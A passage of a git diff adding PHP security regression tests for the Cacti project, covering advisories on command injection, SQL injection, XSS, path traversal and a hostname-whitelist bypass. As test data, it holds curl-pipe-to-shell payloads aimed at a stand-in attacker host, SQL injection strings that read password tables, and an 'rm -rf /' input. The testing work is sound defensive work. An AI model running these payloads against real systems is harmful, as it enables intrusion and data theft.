++test('GHSA-6rvg: remote_agent.php defines remote_agent_strip_domain()', function () use ($remoteAgentPath) {
++	$contents = file_get_contents($remoteAgentPath);
++
++	expect($contents)->toContain('function remote_agent_strip_domain');
++});
++
++test('GHSA-6rvg: stripping domain from two distinct FQDNs yields the same short name', function () {
++	// remote_agent_strip_domain() keeps only the first label. A legitimate
++	// poller 'poller1.corp.example.com' and an attacker-controlled host
++	// 'poller1.evil.com' both reduce to 'poller1', so the whitelist check
++	// passes for the attacker's request.
++	$stripDomain = function (string $host): string {
++		if (str_contains($host, '.')) {
++			return explode('.', $host)[0];
++		}
++
++		return $host;
++	};
++
++	$legitimate = $stripDomain('poller1.corp.example.com');
++	$attacker   = $stripDomain('poller1.evil.com');
++
++	expect($legitimate)->toBe('poller1');
++	expect($attacker)->toBe('poller1');
++	expect($legitimate)->toBe($attacker);
++});
++
++test('GHSA-6rvg: contract — remote_client_authorized uses full FQDN comparison', function () use ($remoteAgentPath) {
++	$contents = file_get_contents($remoteAgentPath);
++
++	// The authorization path must not call remote_agent_strip_domain()
++	// before comparing hostnames.
++	$authFunc  = substr($contents, strpos($contents, 'function remote_client_authorized'));
++	$nextFunc  = strpos($authFunc, "\nfunction ", 1);
++	$authBody  = $nextFunc !== false ? substr($authFunc, 0, $nextFunc) : $authFunc;
++
++	expect($authBody)->not->toContain('remote_agent_strip_domain');
++});
++
++// ---------------------------------------------------------------------------
++// GHSA-8p2f: Reports IDOR — ownership check on DELETE
++// ---------------------------------------------------------------------------
++
++test('GHSA-8p2f: html_reports.php DELETE query includes user_id ownership filter', function () use ($htmlReportsPath) {
++	$contents = file_get_contents($htmlReportsPath);
++
++	// The fix adds AND user_id = ? to the DELETE query and a pre-query
++	// ownership check using SESS_USER_ID.
++	expect($contents)->toContain('DELETE FROM reports WHERE id = ? AND user_id = ?');
++	expect($contents)->toContain('SESS_USER_ID');
++});
++
++// ---------------------------------------------------------------------------
++// GHSA-hr82: TOCTOU lockout race — non-atomic failed_attempts increment
++// ---------------------------------------------------------------------------
++
++test('GHSA-hr82: auth.php uses atomic SQL increment for failed_attempts', function () use ($authPath) {
++	$contents = file_get_contents($authPath);
++
++	// The fix uses SET failed_attempts = failed_attempts + 1 in the UPDATE
++	// so the increment is atomic and cannot be raced.
++	expect($contents)->toContain('failed_attempts = failed_attempts + 1');
++
++	// The old PHP-side increment must not exist.
++	expect($contents)->not->toContain('intval($user[\'failed_attempts\']) + 1');
++});
+diff --git a/tests/Unit/SecurityPrRegressionTest.php b/tests/Unit/SecurityPrRegressionTest.php
+new file mode 100644
+index 0000000000..ad0fd1ad70
+--- /dev/null
++++ b/tests/Unit/SecurityPrRegressionTest.php
+@@ -0,0 +1,143 @@
++<?php
++/*
++ +-------------------------------------------------------------------------+
++ | Copyright (C) 2004-2026 The Cacti Group                                 |
++ |                                                                         |
++ | This program is free software; you can redistribute it and/or           |
++ | modify it under the terms of the GNU General Public License             |
++ | as published by the Free Software Foundation; either version 2          |
++ | of the License, or (at your option) any later version.                  |
++ +-------------------------------------------------------------------------+
++ | Cacti: The Complete RRDtool-based Graphing Solution                     |
++ +-------------------------------------------------------------------------+
++*/
++
++/*
++ * Regression tests for merged security PRs.
++ * Source-scan tests verify that security fixes remain in place.
++ *
++ * PR #6971: rrdtool tune shell escaping in lib/rrd.php
++ * PR #6973: graph_theme LFI prevention in lib/rrd.php
++ * PR #6974: remote_agent effective_user and OID validation
++ */
++
++$rrdPath         = __DIR__ . '/../../lib/rrd.php';
++$remoteAgentPath = __DIR__ . '/../../remote_agent.php';
++
++// --- PR #6971: rrdtool_function_tune shell escaping ---
++
++test('rrdtool_function_tune uses cacti_escapeshellcmd for rrdtool binary path', function () use ($rrdPath) {
++	$contents = file_get_contents($rrdPath);
++
++	expect($contents)->toContain("cacti_escapeshellcmd(read_config_option('path_rrdtool'))");
++});
++
++test('rrdtool_function_tune uses cacti_escapeshellarg for data_source_path', function () use ($rrdPath) {
++	$contents = file_get_contents($rrdPath);
++
++	// The tune command line must escape the data source path
++	expect($contents)->toMatch('/cacti_escapeshellcmd\(.*path_rrdtool.*\)\s*\.\s*\'\s*tune\s*\'\s*\.\s*cacti_escapeshellarg\(\$data_source_path\)/');
++});
++
++test('rrdtool_function_tune uses cacti_escapeshellarg for --heartbeat flag', function () use ($rrdPath) {
++	$contents = file_get_contents($rrdPath);
++
++	expect($contents)->toMatch('/--heartbeat.*cacti_escapeshellarg\(\$data_source_name\s*\.\s*\':\'/');
++});
++
++test('rrdtool_function_tune uses cacti_escapeshellarg for --minimum flag', function () use ($rrdPath) {
++	$contents = file_get_contents($rrdPath);
++
++	expect($contents)->toMatch('/--minimum.*cacti_escapeshellarg\(\$data_source_name\s*\.\s*\':\'/');
++});
++
++test('rrdtool_function_tune uses cacti_escapeshellarg for --maximum flag', function () use ($rrdPath) {
++	$contents = file_get_contents($rrdPath);
++
++	expect($contents)->toMatch('/--maximum.*cacti_escapeshellarg\(\$data_source_name\s*\.\s*\':\'/');
++});
++
++test('rrdtool_function_tune uses cacti_escapeshellarg for --data-source-type flag', function () use ($rrdPath) {
++	$contents = file_get_contents($rrdPath);
++
++	expect($contents)->toMatch('/--data-source-type.*cacti_escapeshellarg\(\$data_source_name\s*\.\s*\':\'/');
++});
++
++test('rrdtool_function_tune uses cacti_escapeshellarg for --data-source-rename flag', function () use ($rrdPath) {
++	$contents = file_get_contents($rrdPath);
++
++	expect($contents)->toMatch('/--data-source-rename.*cacti_escapeshellarg\(\$data_source_name\s*\.\s*\':\'/');
++});
++
++test('rrdtool_function_tune does not pass raw data_source_path to popen', function () use ($rrdPath) {
++	$contents = file_get_contents($rrdPath);
++
++	// Extract just the rrdtool_function_tune function body
++	$start = strpos($contents, 'function rrdtool_function_tune(');
++	if ($start === false) {
++		$this->fail('function rrdtool_function_tune not found in source');
++	}
++	$nextFunc = strpos($contents, "\nfunction ", $start + 1);
++	if ($nextFunc === false) {
++		$this->fail('no function follows rrdtool_function_tune in source');
++	}
++	$tuneBody = substr($contents, $start, $nextFunc - $start);
++
++	// popen should receive $rrd_cmd (pre-escaped), not raw $data_source_path
++	expect($tuneBody)->toContain('popen($rrd_cmd,');
++	expect($tuneBody)->not->toMatch('/popen\s*\([^)]*\$data_source_path/');
++});
++
++// --- PR #6973: graph_theme LFI prevention via basename() ---
++
++test('rrd graph theme applies basename to prevent path traversal', function () use ($rrdPath) {
++	$contents = file_get_contents($rrdPath);
++
++	expect($contents)->toContain("basename(\$graph_data_array['graph_theme'])");
++});
++
++test('rrd graph theme rejects dot-only basename values', function () use ($rrdPath) {
++	$contents = file_get_contents($rrdPath);
++
++	// After basename(), the code must reject '.' and '..' to prevent traversal
++	expect($contents)->toContain("\$theme === '.'");
++	expect($contents)->toContain("\$theme === '..'");
++});
++
++// --- PR #6974: remote_agent effective_user and OID validation ---
++
++test('remote_agent does not accept effective_user from request and uses session user', function () use ($remoteAgentPath) {
++	$contents = file_get_contents($remoteAgentPath);
++
++	expect($contents)->not->toContain("gfrv('effective_user')");
++	expect($contents)->not->toContain("grv('effective_user')");
++	expect($contents)->toContain('$_SESSION[SESS_USER_ID] ?? 0');
++});
++
++test('remote_agent OID validation regex in get_snmp_data', function () use ($remoteAgentPath) {
++	$contents = file_get_contents($remoteAgentPath);
++
++	// OID must match digits-and-dots only pattern: /^[0-9.]+$/
++	expect(str_contains($contents, "preg_match('/^[0-9.]+$/', \$oid)"))->toBeTrue();
++});
++
++test('remote_agent validates OID as string before regex check', function () use ($remoteAgentPath) {
++	$contents = file_get_contents($remoteAgentPath);
++
++	// Type check must precede regex to prevent type juggling
++	expect($contents)->toContain('!is_string($oid)');
++});
++
++test('remote_agent OID validation exists in get_snmp_data_walk', function () use ($remoteAgentPath) {
++	$contents = file_get_contents($remoteAgentPath);
++
++	// Both get_snmp_data and get_snmp_data_walk must validate OIDs
++	$walkStart = strpos($contents, 'function get_snmp_data_walk()');
++	if ($walkStart === false) {
++		$this->fail('function get_snmp_data_walk not found in source');
++	}
++	$walkBody = substr($contents, $walkStart, 600);
++
++	expect($walkBody)->toContain('!is_string($oid)');
++	expect(str_contains($walkBody, "preg_match('/^[0-9.]+$/', \$oid)"))->toBeTrue();
++});
+diff --git a/tests/Unit/SecurityRceTest.php b/tests/Unit/SecurityRceTest.php
+new file mode 100644
+index 0000000000..cb5d124a1f
+--- /dev/null
++++ b/tests/Unit/SecurityRceTest.php
+@@ -0,0 +1,149 @@
++<?php
++/*
++ +-------------------------------------------------------------------------+
++ | Copyright (C) 2004-2026 The Cacti Group                                 |
++ |                                                                         |
++ | This program is free software; you can redistribute it and/or           |
++ | modify it under the terms of the GNU General Public License             |
++ | as published by the Free Software Foundation; either version 2          |
++ | of the License, or (at your option) any later version.                  |
++ +-------------------------------------------------------------------------+
++ | Cacti: The Complete RRDtool-based Graphing Solution                     |
++ +-------------------------------------------------------------------------+
++*/
++
++require_once dirname(__DIR__) . '/Helpers/CactiStubs.php';
++require_once dirname(__DIR__, 2) . '/include/global.php';
++require_once dirname(__DIR__, 2) . '/lib/rrd.php';
++
++// =====================================================================
++// GHSA-wpjq: exec_background log path RCE (boost.php)
++//
++// boost.php lines 1847/1850 concatenate $boost_log directly into a
++// shell redirect string without escapeshellarg().  An attacker who
++// controls the stored "boost_log_path" setting can terminate the
++// redirect and inject arbitrary shell commands.
++// =====================================================================
++
++test('GHSA-wpjq source: boost.php wraps boost_log with cacti_escapeshellarg in redirect', function () {
++	$source = file_get_contents(dirname(__DIR__, 2) . '/lib/boost.php');
++
++	// The fix must escape boost_log before shell redirect concatenation.
++	expect($source)->toContain('cacti_escapeshellarg($boost_log)');
++
++	// The old unescaped pattern must no longer exist.
++	expect($source)->not->toContain(">> ' . \$boost_log . ' 2>&1");
++});
++
++test('GHSA-wpjq unit: shell metacharacters in a log path survive redirect string construction', function () {
++	// Simulate what boost.php does at lines 1847/1850.
++	$boost_log     = '/tmp/x; curl http://evil.example.com/x|sh #';
++	$redirect_args = '>> ' . $boost_log . ' 2>&1';
++
++	// The injected payload is present verbatim in the resulting shell string.
++	expect($redirect_args)->toContain('; curl http://evil.example.com/x|sh #');
++
++	// A correct implementation wraps the path in single quotes via escapeshellarg,
++	// so the shell treats the entire string as one literal argument and cannot
++	// interpret the semicolon as a command separator.
++	$safe_redirect = '>> ' . escapeshellarg($boost_log) . ' 2>&1';
++
++	// The quoted form must start immediately after '>> ' with a single-quote,
++	// meaning the shell sees one token rather than multiple commands.
++	$after_redirect = substr($safe_redirect, strlen('>> '));
++	expect($after_redirect)->toStartWith("'");
++	expect($after_redirect)->toEndWith("' 2>&1");
++});
++
++// =====================================================================
++// GHSA-8522: escape_command() is a no-op (rrd.php)
++//
++// rrd.php lines 33-34: escape_command() unconditionally returns its
++// input unchanged.  Every call-site that passes user-influenced data
++// through escape_command() before shell execution receives no protection.
++// =====================================================================
++
++test('GHSA-8522 source: escape_command strips command substitution patterns', function () {
++	$source = file_get_contents(dirname(__DIR__, 2) . '/lib/rrd.php');
++
++	// The function must NOT contain the old no-op return.
++	expect($source)->not->toContain("return \$command;\t");
++	// It must strip backticks and $() substitution.
++	expect($source)->toContain("str_replace('`', '', \$command)");
++	expect($source)->toContain("preg_replace('/\\$\\(/', '(', \$command)");
++});
++
++test('GHSA-8522 unit: escape_command strips backtick and $() but preserves standalone $', function () {
++	$payload = 'test `id` $(whoami) $5.00';
++
++	$result = escape_command($payload);
++
++	// Backticks stripped, $() converted to (), standalone $ preserved
++	expect($result)->toBe('test id (whoami) $5.00');
++	expect($result)->not->toContain('`');
++});
++
++// =====================================================================
++// GHSA-xq98: host variable injection via substitute_host_data (variables.php)
++//
++// variables.php lines 362-367: host fields (description, notes, …) are
++// substituted with str_replace() into command strings that are later
++// passed to the shell.  escape_command() now strips backticks and $.
++// =====================================================================
++
++test('GHSA-xq98 unit: str_replace of host_description with command-substitution payload preserves metacharacters', function () {
++	// Reproduce the substitution that substitute_host_data() performs.
++	$command     = 'rrdtool update |host_description|.rrd N:1';
++	$description = '$(id)';
++
++	$result = str_replace('|host_description|', $description, $command);
++
++	expect($result)->toContain('$(id)');
++	expect($result)->toBe('rrdtool update $(id).rrd N:1');
++});
++
++test('GHSA-xq98 unit: str_replace of host_notes with backtick payload preserves execution context', function () {
++	$command = 'rrdtool fetch |host_notes|.rrd AVERAGE';
++	$notes   = '`curl http://evil.example.com/x|sh`';
++
++	$result = str_replace('|host_notes|', $notes, $command);
++
++	expect($result)->toContain('`curl http://evil.example.com/x|sh`');
++});
++
++test('GHSA-8522 contract: escape_command neutralizes command substitution', function () {
++	$dangerous = 'valid_arg `id` $(whoami)';
++
++	$result = escape_command($dangerous);
++
++	// Backticks removed, $() neutralized
++	expect($result)->not->toContain('`');
++	expect($result)->not->toContain('$(');
++	expect($result)->toBe('valid_arg id (whoami)');
++});
++
++// =====================================================================
++// GHSA-c4qp: data input RCE via whitelist bypass (utility.php / data_input.php)
++//
++// Two independent bypass paths:
++//   1. data_input.php line 98: input_string saved with empty regex (''),
++//      so form_input_validate() accepts any value including shell commands.
++//   2. utility.php line 1007: when CACTI_WHITELIST is not defined the
++//      function returns true unconditionally — everything is permitted.
++// =====================================================================
++
++test('GHSA-c4qp source: data_input.php saves input_string with empty regex allowing any value', function () {
++	$source = file_get_contents(dirname(__DIR__, 2) . '/data_input.php');
++
++	// form_input_validate(…, 'input_string', '', true, 3) — third arg is the
++	// regex pattern; an empty string means no pattern validation is applied.
++	expect($source)->toContain("form_input_validate(gnrv('input_string'), 'input_string', '', true, 3)");
++});
++
++test('GHSA-c4qp source: data_input_whitelist_check returns true when CACTI_WHITELIST constant is not defined', function () {
++	$source = file_get_contents(dirname(__DIR__, 2) . '/lib/utility.php');
++
++	// The early-return path that bypasses all whitelist enforcement.
++	expect($source)->toContain("if (!defined('CACTI_WHITELIST'))");
++	expect($source)->toContain('return true;');
++});
+diff --git a/tests/Unit/SecuritySqliTest.php b/tests/Unit/SecuritySqliTest.php
+new file mode 100644
+index 0000000000..fa9259fb5c
+--- /dev/null
++++ b/tests/Unit/SecuritySqliTest.php
+@@ -0,0 +1,250 @@
++<?php
++/*
++ +-------------------------------------------------------------------------+
++ | Copyright (C) 2004-2026 The Cacti Group                                 |
++ |                                                                         |
++ | This program is free software; you can redistribute it and/or           |
++ | modify it under the terms of the GNU General Public License             |
++ | as published by the Free Software Foundation; either version 2          |
++ | of the License, or (at your option) any later version.                  |
++ +-------------------------------------------------------------------------+
++ | Cacti: The Complete RRDtool-based Graphing Solution                     |
++ +-------------------------------------------------------------------------+
++*/
++
++/*
++ * Contract and regression tests for SQL injection advisories.
++ *
++ * Each group documents the vulnerable code path so the tests serve as
++ * living proof-of-the-bug, not just proof-of-the-fix.
++ */
++
++require_once dirname(__DIR__) . '/Helpers/CactiStubs.php';
++require_once dirname(__DIR__, 2) . '/include/global.php';
++
++// =====================================================================
++// GHSA-69gg / GHSA-9jqv: RLIKE SQL injection via rfilter
++//
++// Affected paths:
++//   lib/html_graph.php:858  -- " gtg.title_cache RLIKE '" . grv('rfilter') . "'"
++//   lib/html_tree.php:1432  -- " gtg.title_cache RLIKE '" . grv('rfilter') . "'"
++//
++// grv() is an alias of get_request_var(), which returns the raw
++// $_REQUEST value (or the $_CACTI_REQUEST pre-filtered value when set).
++// The rfilter value is concatenated directly into SQL without escaping.
++// sanitize_search_string() is NOT called on RLIKE operands.
++// =====================================================================
++
++test('sanitize_search_string does not strip SQL keywords UNION SELECT OR', function () {
++	// The function is intended for keyword/phrase search display, not SQL safety.
++	// It only removes shell/HTML metacharacters. SQL keywords pass through unchanged,
++	// so callers cannot rely on it as a SQL injection barrier.
++	$payload = 'UNION SELECT password OR 1 FROM user_auth';
++
++	$result = sanitize_search_string($payload);
++
++	expect($result)->toContain('UNION')
++		->and($result)->toContain('SELECT')
++		->and($result)->toContain('FROM')
++		->and($result)->toContain('OR');
++});
++
++test('grv returns raw request variable value without SQL escaping', function () {
++	// grv() -> get_request_var() -> $_REQUEST[$name] when not pre-filtered.
++	// No addslashes(), no db_qstr(), no htmlspecialchars() is applied.
++	// Proof: set a value in $_REQUEST and confirm grv() returns it byte-for-byte.
++	$payload = "a' OR '1'='1";
++	$_REQUEST['rfilter'] = $payload;
++
++	$result = grv('rfilter');
++
++	expect($result)->toBe($payload);
++
++	unset($_REQUEST['rfilter']);
++});
++
++test('RLIKE payload is valid PCRE so MySQL accepts it without error', function () {
++	// MySQL RLIKE uses PCRE. A quote-terminated payload that is also valid PCRE
++	// allows the attacker to close the string literal and inject arbitrary SQL.
++	// preg_match() here stands in for MySQL's REGEXP engine acceptance check.
++	$payload = "a' OR 1=1 -- ";
++
++	// The RLIKE operand in the query becomes: RLIKE 'a' OR 1=1 -- '
++	// The portion before the injected quote is a valid PCRE pattern.
++	$pcre_portion = "a";
++	expect(preg_match('/' . $pcre_portion . '/', 'a'))->toBe(1);
++});
++
++test('get_request_var does not alter SQL-dangerous characters for RLIKE context', function () {
++	// Contract: get_request_var() must not silently sanitize values because
++	// callers that need raw data (like RLIKE construction) rely on receiving
++	// the unmodified string. This means callers bear full responsibility for
++	// escaping before interpolating into SQL.
++	//
++	// get_request_var() checks $_CACTI_REQUEST before $_REQUEST, so clear
++	// any cached value from prior tests that exercised grv() on the same key.
++	global $_CACTI_REQUEST;
++	unset($_CACTI_REQUEST['rfilter']);
++
++	$dangerous = "x' UNION SELECT 1,2,3 -- ";
++	$_REQUEST['rfilter'] = $dangerous;
++
++	$returned = get_request_var('rfilter');
++
++	// The value arrives at the SQL construction site unmodified.
++	expect($returned)->toBe($dangerous);
++
++	unset($_REQUEST['rfilter'], $_CACTI_REQUEST['rfilter']);
++});
++
++// =====================================================================
++// GHSA-pf37: Stored REGEXP SQL injection via graph_name_regexp
++//
++// Affected path:
++//   lib/html_reports.php:361  -- $save['graph_name_regexp'] = gnrv('graph_name_regexp');
++//   lib/reports.php:1236      -- " AND title_cache REGEXP '" . $item['graph_name_regexp'] . "'"
++//   lib/reports.php:1427      -- " AND title_cache REGEXP '" . $item['graph_name_regexp'] . "'"
++//   lib/reports.php:1473      -- (same pattern, leaf_type == 'graph')
++//   lib/reports.php:1489      -- (same pattern, leaf_type == 'graph' nested)
++//
++// gnrv() is get_nfilter_request_var(): returns $_REQUEST[$name] raw.
++// The value is stored to the DB without validation and later concatenated
++// into SQL REGEXP clauses without parameterization.
++// =====================================================================
++
++test('gnrv returns payload unmodified with no validation on save', function () {
++	// gnrv() -> get_nfilter_request_var(): explicitly bypasses all filter checks.
++	// graph_name_regexp is written with gnrv() directly to $save, so any
++	// SQL metacharacters reach the database column unchanged.
++	$payload = "x' UNION SELECT password,2 FROM user_auth -- ";
++	$_REQUEST['graph_name_regexp'] = $payload;
++
++	$result = gnrv('graph_name_regexp');
++
++	expect($result)->toBe($payload);
++
++	unset($_REQUEST['graph_name_regexp']);
++});
++
++test('lib/reports.php uses string concatenation not parameterized query for REGEXP', function () {
++	// Source code contract: the REGEXP clause must be built by concatenation,
++	// not by a prepared-statement placeholder, for the advisory to apply.
++	// This test catches any future accidental reversion of a parameterized fix.
++	$reportsPath = dirname(__DIR__, 2) . '/lib/reports.php';
++	$source      = file_get_contents($reportsPath);
++
++	// All REGEXP sites must use db_qstr() instead of string concatenation.
++	expect($source)->not->toContain("REGEXP '\" . \$item['graph_name_regexp'] . \"'");
++	expect($source)->toContain('REGEXP ')
++		->and($source)->toContain("db_qstr(\$item['graph_name_regexp'])");
++});
++
++// =====================================================================
++// GHSA-84q3: ORDER BY SQL injection via sort/sort_direction parameters
++//
++// The sort column value passes through sanitize_search_string() before
++// being appended to an ORDER BY clause. The function strips quotes,
++// backticks, and semicolons, but leaves spaces and SQL keywords intact,
++// so multi-word payloads like "id,(SELECT ...)" survive after the
++// parentheses are stripped, yielding injectable fragments.
++// =====================================================================
++
++test('sanitize_search_string returns UNION SELECT payload mostly intact', function () {
++	// The function is not an ORDER BY allowlist. Spaces and keywords survive.
++	$payload = '1 UNION SELECT password FROM user_auth--';
++
++	$result = sanitize_search_string($payload);
++
++	// Quotes and # are stripped; the keywords and spaces remain.
++	expect($result)->toContain('UNION')
++		->and($result)->toContain('SELECT')
++		->and($result)->toContain('FROM');
++});
++
++test('sanitize_search_string strips quotes backticks and semicolons but not spaces or keywords', function () {
++	// Verify precisely which characters are in the drop list and which are not.
++	// drop_char_match: ( ) ^ $ < > ` ' " | , ? + [ ] { } # ; ! = *
++	$withQuotes    = "col' OR 1=1";
++	$withBacktick  = '`col`';
++	$withSemicolon = 'col; DROP TABLE';
++	$withKeyword   = 'col UNION SELECT';
++
++	expect(sanitize_search_string($withQuotes))->not->toContain("'")
++		->and(sanitize_search_string($withBacktick))->not->toContain('`')
++		->and(sanitize_search_string($withSemicolon))->not->toContain(';')
++		->and(sanitize_search_string($withKeyword))->toContain('UNION')
++		->and(sanitize_search_string($withKeyword))->toContain('SELECT');
++});
++
++test('sort_column values reaching ORDER BY must be validated against an allowlist', function () {
++	// Contract: the fix for GHSA-84q3 must use an explicit column allowlist,
++	// not sanitize_search_string(), because the latter does not block keywords.
++	// This test asserts the structural requirement: an allowlist is the only
++	// safe mitigation for ORDER BY injection.
++	//
++	// We verify that sanitize_search_string alone is INSUFFICIENT as a guard
++	// by confirming a dangerous fragment survives it.
++	$orderByPayload = 'local_graph_id,(SELECT SLEEP(5))';
++
++	$sanitized = sanitize_search_string($orderByPayload);
++
++	// Parentheses are stripped, but the keyword survives -- not safe for ORDER BY.
++	expect($sanitized)->toContain('SELECT');
++});
++
++// =====================================================================
++// GHSA-j9jv: SQL injection in managers.php via unserialize + implode
++//
++// Affected path: managers.php form_actions()
++//   $selected_items = cacti_unserialize(stripslashes(gnrv('selected_graphs_array')));
++//   db_execute('DELETE FROM snmpagent_managers WHERE id IN (' . implode(',', $selected_items) . ')');
++//
++// cacti_unserialize() wraps unserialize() with allowed_classes=false,
++// which prevents object injection but does NOT sanitize string values
++// within the array. A serialized array of SQL payload strings passes
++// through and is imploded directly into the query without escaping.
++// =====================================================================
++
++test('cacti_unserialize with allowed_classes false still returns string array values intact', function () {
++	// allowed_classes=false blocks object injection; it does not filter strings.
++	$items = serialize(['1', '2', '3']);
++
++	$result = cacti_unserialize($items);
++
++	expect($result)->toBe(['1', '2', '3']);
++});
++
++test('serialized array with SQL payload deserializes with payload intact', function () {
++	// The attack vector: attacker submits a serialized array where one element
++	// is a SQL fragment. cacti_unserialize() returns it unchanged because
++	// allowed_classes=false only prevents __PHP_Incomplete_Class instantiation.
++	$payload      = '1) OR 1=1--';
++	$serialized   = serialize([$payload]);
++
++	$result = cacti_unserialize($serialized);
++
++	expect($result)->toBeArray()
++		->and($result[0])->toBe($payload);
++});
++
++test('implode of deserialized payload produces injectable SQL fragment', function () {
++	// End-to-end proof: the exact code path in managers.php form_actions().
++	// After cacti_unserialize() the array is passed to implode(',', $items)
++	// and the result is concatenated into the query string.
++	$payload     = '1) OR 1=1--';
++	$serialized  = serialize([$payload]);
++	$items       = cacti_unserialize($serialized);
++
++	$sql_fragment = implode(',', $items);
++	$query        = 'DELETE FROM snmpagent_managers WHERE id IN (' . $sql_fragment . ')';
++
++	// The resulting query contains the unescaped injection payload.
++	expect($query)->toContain('OR 1=1');
++});
++
++// Covered advisories:
++//   GHSA-69gg  RLIKE injection via rfilter (html_graph.php)
++//   GHSA-9jqv  RLIKE injection via rfilter (html_tree.php)
++//   GHSA-pf37  Stored REGEXP injection via graph_name_regexp (html_reports.php / reports.php)
++//   GHSA-84q3  ORDER BY injection (sanitize_search_string insufficient guard)
++//   GHSA-j9jv  managers.php unserialize+implode injection
+diff --git a/tests/Unit/SecurityValidationHelpersTest.php b/tests/Unit/SecurityValidationHelpersTest.php
+new file mode 100644
+index 0000000000..a682b9d573
+--- /dev/null
++++ b/tests/Unit/SecurityValidationHelpersTest.php
+@@ -0,0 +1,80 @@
++<?php
++/*
++ +-------------------------------------------------------------------------+
++ | Copyright (C) 2004-2026 The Cacti Group                                 |
++ |                                                                         |
++ | This program is free software; you can redistribute it and/or           |
++ | modify it under the terms of the GNU General Public License             |
++ | as published by the Free Software Foundation; either version 2          |
++ | of the License, or (at your option) any later version.                  |
++ +-------------------------------------------------------------------------+
++*/
++
++require_once dirname(__DIR__) . '/Helpers/CactiStubs.php';
++require_once dirname(__DIR__, 2) . '/include/global.php';
++
++test('security helpers: data input string allows pipes but blocks dangerous shell metacharacters', function () {
++	expect(cacti_input_string_is_safe('grep foo /tmp/x | wc -l'))->toBeTrue();
++	expect(cacti_input_string_is_safe('php <path_php_binary> -q <path_cacti>/script.php'))->toBeTrue();
++	expect(cacti_input_string_is_safe('cat /tmp/x; rm -rf /'))->toBeFalse();
++	expect(cacti_input_string_is_safe('echo `id`'))->toBeFalse();
++	expect(cacti_input_string_is_safe('echo $(id)'))->toBeFalse();
++});
++
++test('security helpers: sort validation enforces constrained column and direction', function () {
++	expect(cacti_validate_sort_column('description', 'description'))->toBe('description');
++	expect(cacti_validate_sort_column('`description`', 'description'))->toBe('`description`');
++	expect(cacti_validate_sort_column('description;drop', 'description'))->toBe('description');
++	expect(cacti_validate_sort_column('', 'description'))->toBe('description');
++	expect(cacti_validate_sort_column('   ', 'description'))->toBe('description');
++	expect(cacti_validate_sort_direction('desc', 'ASC'))->toBe('DESC');
++	expect(cacti_validate_sort_direction('sideways', 'ASC'))->toBe('ASC');
++	expect(cacti_validate_sort_direction('', 'ASC'))->toBe('ASC');
++	expect(cacti_validate_sort_direction('   ', 'ASC'))->toBe('ASC');
++});
++
++test('security helpers: managers id extraction keeps only positive integers', function () {
++	$ids = cacti_extract_positive_int_ids(['1', '-5', '0', '4.2', 'abc', '7', '9 OR 1=1', ' +7', ' 08 ']);
++
++	expect($ids)->toBe([1, 4, 7, 9, 7, 8]);
++});
++
++test('security helpers: remote agent forward lookup requires exact ip match', function () {
++	$allowed = cacti_remote_agent_forward_matches('10.0.0.5', 'poller.example.com', function () {
++		return [
++			['ip' => '10.0.0.4'],
++			['ipv6' => '2001:db8::42'],
++			['ip' => '10.0.0.5'],
++		];
++	});
++
++	$blocked = cacti_remote_agent_forward_matches('10.0.0.7', 'poller.example.com', function () {
++		return [
++			['ip' => '10.0.0.4'],
++			['ipv6' => '2001:db8::42'],
++		];
++	});
++
++	expect($allowed)->toBeTrue();
++	expect($blocked)->toBeFalse();
++});
++
++test('security helpers: remote agent host authorization requires exact fqdn or ip', function () {
++	$pollers = [
++		['hostname' => 'poller01.example.com'],
++		['hostname' => '10.0.0.10'],
++	];
++
++	expect(cacti_remote_agent_is_authorized_host('poller01.example.com', '10.0.0.9', $pollers, []))->toBeTrue();
++	expect(cacti_remote_agent_is_authorized_host('other.example.com', '10.0.0.10', $pollers, []))->toBeTrue();
++	expect(cacti_remote_agent_is_authorized_host('poller01', '10.0.0.9', $pollers, []))->toBeFalse();
++	expect(cacti_remote_agent_is_authorized_host('other.example.com', '10.0.0.99', $pollers, ['10.0.0.99']))->toBeTrue();
++});
++
++test('security helpers: remote agent hostname match is case-insensitive', function () {
++	$pollers = [
++		['hostname' => 'PoLlEr01.Example.COM'],
++	];
++
++	expect(cacti_remote_agent_is_authorized_host('poller01.example.com', '10.0.0.9', $pollers, []))->toBeTrue();
++});
+diff --git a/tests/Unit/SecurityXssPathTest.php b/tests/Unit/SecurityXssPathTest.php
+new file mode 100644
+index 0000000000..490415ec8e
+--- /dev/null
++++ b/tests/Unit/SecurityXssPathTest.php
+@@ -0,0 +1,176 @@
++<?php
++/*
++ +-------------------------------------------------------------------------+
++ | Copyright (C) 2004-2026 The Cacti Group                                 |
++ |                                                                         |
++ | This program is free software; you can redistribute it and/or           |
++ | modify it under the terms of the GNU General Public License             |
++ | as published by the Free Software Foundation; either version 2          |
++ | of the License, or (at your option) any later version.                  |
++ +-------------------------------------------------------------------------+
++ | Cacti: The Complete RRDtool-based Graphing Solution                     |
++ +-------------------------------------------------------------------------+
++*/
++
++/*
++ * Source-level and contract tests for XSS and path-traversal advisories.
++ *
++ * GHSA-6233: Stored XSS in report tree titles (lib/reports.php)
++ * GHSA-fwh3: Reflected XSS via rfilter in aggregate_graphs.php
++ * GHSA-vp35: Path traversal in package import file write (lib/import.php)
++ * GHSA-pr9x: Path traversal in package_import.php read
++ * GHSA-mjvw: Path traversal via format_file in reports
++ */
++
++$reportsPath         = __DIR__ . '/../../lib/reports.php';
++$aggregateGraphsPath = __DIR__ . '/../../aggregate_graphs.php';
++$importPath          = __DIR__ . '/../../lib/import.php';
++$packageImportPath   = __DIR__ . '/../../package_import.php';
++$htmlReportsPath     = __DIR__ . '/../../lib/html_reports.php';
++
++// ---------------------------------------------------------------------------
++// GHSA-6233: Stored XSS in report tree titles
++// ---------------------------------------------------------------------------
++
++test('GHSA-6233: reports.php escapes all title outputs with htmle()', function () use ($reportsPath) {
++	$contents = file_get_contents($reportsPath);
++
++	// No raw <h3>$title</h3> interpolation should remain after the fix.
++	$unescapedCount = substr_count($contents, '<h3>$title</h3>');
++	expect($unescapedCount)->toBe(0);
++
++	// All title outputs must use htmle()
++	$escapedCount = substr_count($contents, 'htmle($title)');
++	expect($escapedCount)->toBeGreaterThanOrEqual(7);
++});
++
++test('GHSA-6233: reports.php line 943 uses htmle() for report name (safe pattern exists)', function () use ($reportsPath) {
++	$contents = file_get_contents($reportsPath);
++
++	expect($contents)->toContain('<h3>" . htmle($report[\'name\']) . \'</h3>');
++});
++
++// ---------------------------------------------------------------------------
++// GHSA-fwh3: Reflected XSS via rfilter in aggregate_graphs.php
++// ---------------------------------------------------------------------------
++
++test('GHSA-fwh3: aggregate_graphs.php escapes rfilter with htmlerv in value attribute', function () use ($aggregateGraphsPath) {
